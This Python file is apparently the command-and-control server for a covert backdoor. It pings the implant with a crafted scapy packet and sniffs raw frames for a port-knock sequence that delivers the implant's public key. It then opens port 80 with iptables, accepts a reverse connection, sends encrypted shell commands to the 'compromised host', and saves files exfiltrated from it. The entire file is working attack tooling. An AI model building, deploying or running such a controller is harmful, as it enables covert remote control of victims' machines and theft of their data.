import logging
from struct import *
import scapy
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.all import IP, TCP, send
from Crypto.PublicKey import RSA
from Crypto import Random
import fcntl, select, socket, struct, subprocess, sys, threading, time
from Crypto.Cipher import PKCS1_OAEP

# generate RSA private/public key pair
KEY_LENGTH = 2048
randomGen = Random.new().read
keypair = RSA.generate(KEY_LENGTH, randomGen)
# get public key so it can be passed onto the backdoor for use
publicKey=keypair.publickey()
backdoorPublicKey = ''



def pingBackdoor():
    targetIP = input('Enter IP address of backdoor: ')
    # send crafted packet to backdoor to initiate reverse TCP connection
    ip = IP(dst=targetIP)
    tcp = TCP(sport=8505, dport=8505)
    send(ip/tcp/publicKey.exportKey(), verbose=False)
    return

def getCommands(clientSocket, publicKey, commandProcessed, printOutputLock):
    getCommand = True

    # get commands to send to compromised host in plaintext... add encryption afterwards
    while getCommand:
        with printOutputLock:
            command =''
            while not command:
                command = input('[backdoor@%s]# ' % clientSocket.getpeername()[0])
                print(command)
        print(command)
        arr=bytes(command,'utf-8')
        encrypter = PKCS1_OAEP.new(publicKey)
        ciphertext = encrypter.encrypt(arr)

        # print(ciphertext)

        clientSocket.send(ciphertext)

        if command == 'exit':
            getCommand = False

        # wait for backdoor to process command before getting the next command
        commandProcessed.clear()
        commandProcessed.wait()
    return

def openFirewall():
    # open port 80 for 5 seconds
    subprocess.Popen(['iptables', '-I', 'INPUT', '-p', 'tcp', '--dport', '80', '-j', 'ACCEPT'])
    time.sleep(5)
    # close port 80 afterwards, however initializeFirewall.sh is set to permit existing connections to stay
    subprocess.Popen(['iptables', '-D', 'INPUT', '-p', 'tcp', '--dport', '80', '-j', 'ACCEPT'])
    return

def portKnockTimer(portKnockStarted):
    portKnockStarted.wait()
    time.sleep(1)
    if portKnockStarted.isSet():
        portKnockStarted.clear()
        print('port knock window expired')
    else:
        return

def startServer():
    ETHERNET = 0x0003
    ETHERNET_HEADER_LENGTH = 14
    LISTEN_PORT = 80
    QUEUE_SIZE = 128
    BUFFER_SIZE = 1024
    portKnockSequence = [7005, 8005, 8505]
    expectedPacket = 0
    endOfChunk = b'8505eoc'
    endOfOutput = b'8505eoo'
    endOfDownload = b'8505eod'
    backdoorConnections = {}
    portKnockStarted = threading.Event()
    commandProcessed = threading.Event()
    printOutputLock = threading.Lock() # use this to control console output in the near future
    serverRunning = True
  
   
    

    # configure firewall to block all incoming traffic except outgoing traffic from port 80
    subprocess.Popen(['bash', './initializeFirewall.sh'])

    try:
        # create a raw socket that reads all incoming/outgoing ethernet frames
        sniffingSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETHERNET))
        # set up a socket to listen for connections on port 80
        listenSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # allow port to be reused immediately if previous execution has left it in a TIME_WAIT state
        listenSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # set socket to non-blocking
        listenSocket.setblocking(0)
        # bind socket to port (using '' sets the socket to listen on all interfaces)
        listenSocket.bind(('', LISTEN_PORT))
        # set socket to listen for connection requests
        listenSocket.listen(QUEUE_SIZE)
    except socket.error as msg:
        print ('Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
        sys.exit()

    # set up epoll object with edge triggering
    # inputSet = [sys.stdin.fileno(), sniffingSocket.fileno(), listenSocket.fileno()]
    inputSet = [sniffingSocket.fileno(), listenSocket.fileno()]
    epoll = select.epoll()
    for input in inputSet:
        epoll.register(input, select.EPOLLIN | select.EPOLLET)

    while serverRunning:
        # query the epoll object to get a list of events that we're interested in. The 1 indicates we're willing to
        # wait up to 1 second for an event to occur
        events = epoll.poll(1)
        for fileno, event in events:
            # if data has been detected on the listening socket, the compromised PC is trying to connect
            if fileno == listenSocket.fileno():
                # accept the client socket and set it to non-blocking
                backdoorSocket, address = listenSocket.accept()
                # backdoorSocket.setblocking(0)
                # tell epoll we're interested when the client socket has data to read from
                epoll.register(backdoorSocket.fileno(), select.EPOLLIN | select.EPOLLET)
                # add client to list of active connections
                backdoorConnections[backdoorSocket.fileno()] = backdoorSocket
                # tell epoll to keep notifying us when it detects data on the listening socket
                epoll.modify(listenSocket.fileno(), select.EPOLLIN | select.EPOLLET)
                print ('backdoor on %s connected!' % backdoorSocket.getpeername()[0])
                # spawn thread to get commands for the session
                getCommandsThread = threading.Thread(target=getCommands, args=(backdoorSocket,
                                                                               backdoorPublicKey,
                                                                               commandProcessed,
                                                                               printOutputLock))
                getCommandsThread.start()
            # if a packet is ready for sniffing, read its contents
            elif fileno == sniffingSocket.fileno():
                packet = sniffingSocket.recvfrom(BUFFER_SIZE)
                packet = packet[0]

                # read the first 14 bytes which contains the ethernet header
                ethernetHeaderRaw = packet[:ETHERNET_HEADER_LENGTH]
                ethernetHeader = unpack('!6s6sH', ethernetHeaderRaw)

                # ethernetType of 0x0800 indicates an IP packet is in the Ethernet frame
                if ethernetHeader[2] == 0x0800:
                    # read the IP header, which is typically the next 20 bytes after the ethernet header
                    ipHeaderRaw = packet[ETHERNET_HEADER_LENGTH:ETHERNET_HEADER_LENGTH + 20]
                    ipHeader = unpack('!BBHHHBB2s4s4s', ipHeaderRaw)
                    ipHeaderLength = (ipHeader[0] & 0xF) * 4
                    # protocol value of 6 indicates TCP datagram
                    if ipHeader[6] == 6:
                        tcpHeaderRaw = packet[ETHERNET_HEADER_LENGTH + ipHeaderLength:ETHERNET_HEADER_LENGTH +
                                                                                      ipHeaderLength + 20]
                        tcpHeader = unpack('!HHLLBBH2sH', tcpHeaderRaw)
                        if tcpHeader[1] == portKnockSequence[expectedPacket]:
                            if expectedPacket == 0 and not portKnockStarted.isSet():
                                portKnockStarted.set()
                                with printOutputLock:
                                    print ('port knock detected from IP address %s' % socket.inet_ntoa(ipHeader[8]))
                                portKnockTimerThread = threading.Thread(target=portKnockTimer,
                                                                        args=(portKnockStarted,))
                                portKnockTimerThread.start()
                                expectedPacket = (expectedPacket + 1) % len(portKnockSequence)
                            elif portKnockStarted.isSet():
                                if expectedPacket == len(portKnockSequence) - 1:
                                    # the backdoor's public key will be sent in the final packet of the port knock
                                    dataOffset = (tcpHeader[4] >> 4) * 4
                                    data = packet[ETHERNET_HEADER_LENGTH + ipHeaderLength + dataOffset:]
                                    print(data)
                                    print(type(data))
                                    # data1=str(data,'utf-8')
                                    # print(type(data1))
                                    # print(data1)
                                    # b=data1
                                   
                                    # print(b)
                                    # value=b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlcj+SUg0AR2NtKLlPV1M\nEuAkSn733IybCr+7k0KKkgp7nqBqt+fJkzdVA6hRGOnvBI0JavKlTERTruGHcpyz\nwgyAKYrRjAUicw6/+sh2jp62/tPXPUxLKTRg3ct0ZHVYjytNKnsFqT+FchUlCXAZ\niizuWoHLC5EKuydVq/XfbvPGJbsbo/NWyAI4HDsHBt0qS31y86EEpiDlvnRsp5B1\na6asg/L4fMXu47ijz3gm5AU+aKVPxUsnM2UrF/wpasZB0JBTwaqnXfggZRibkk/+\nz0+iusyOdMvBnsyzQYTwbefcGeqvIqUJLY3+LqGn1+Rt/BN5/H+EqCtP8onOXeTT\nDwIDAQAB\n-----END PUBLIC KEY-----'

                                    backdoorPublicKey = RSA.importKey(data)
                                    portKnockStarted.clear()
                                    with printOutputLock:
                                        print ('port knock completed successfully, port 80 opening')
                                    openFirewallThread = threading.Thread(target=openFirewall, args=())
                                    openFirewallThread.start()
                                expectedPacket = (expectedPacket + 1) % len(portKnockSequence)
                            else:
                                expectedPacket = 0
                                portKnockStarted.clear()
                # tell epoll we're interested when another packet is ready for sniffing
                epoll.modify(fileno, select.EPOLLIN | select.EPOLLET)
            # if data has been detected from the backdoor, there is data from the command waiting to be returned
            elif event and select.EPOLLIN:
                bufferedData = b''
                while True:
                    buffer = (backdoorConnections[fileno].recv(BUFFER_SIZE))
                    encrypting=PKCS1_OAEP.new(keypair)

                    if len(buffer) == 0:
                        print ('backdoor connection terminated')
                        backdoorConnections[fileno].close()
                        backdoorConnections.pop(fileno)
                        epoll.unregister(fileno)
                        commandProcessed.set()
                        serverRunning = False
                        break
                    elif endOfOutput in buffer:
                        bufferedData += buffer[:buffer.find(endOfOutput)]
                        encryptedData = bufferedData.split(endOfChunk)
                        decryptedData = b''

                        for chunk in encryptedData:
                            decryptedData += encrypting.decrypt(chunk)

                        result=decryptedData.decode('utf-8')
                        print(result)

                        # tell epoll we're interested when the client socket has data waiting to be read from again
                        epoll.modify(fileno, select.EPOLLIN | select.EPOLLET)
                        commandProcessed.set()
                        break
                    elif endOfDownload in buffer:
                        bufferedData += buffer[:buffer.find(endOfDownload)]
                        encryptedData = bufferedData.split(endOfChunk)
                        decryptedData = b''

                        for chunk in encryptedData:
                        
                            decryptedData += encrypting.decrypt(chunk)

                        f = open('receivedFile-' + str(time.strftime("%H:%M:%S")), 'w')
                        result=decryptedData.decode('utf-8')
                        f.write(result)
                        f.close()
                        #print decryptedData

                        # tell epoll we're interested when the client socket has data waiting to be read from again
                        epoll.modify(fileno, select.EPOLLIN | select.EPOLLET)
                        commandProcessed.set()
                        break
                    else:
                        bufferedData += buffer

    
    # stop the server gracefully
    listenSocket.close()
    sniffingSocket.close()
    subprocess.Popen(['bash', './openFirewall.sh'])
# print(bufferedData)

if __name__ == '__main__':
    startServerThread = threading.Thread(target=startServer, args=())
    startServerThread.daemon = True
    startServerThread.start()
    pingBackdoorThread = threading.Thread(target=pingBackdoor, args=())
    pingBackdoorThread.daemon = True
    pingBackdoorThread.start()

    # keep main thread alive so we can catch KeyboardInterrupt
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        subprocess.Popen(['bash', './openFirewall.sh'])
        print ('\nStopping C&C server!')
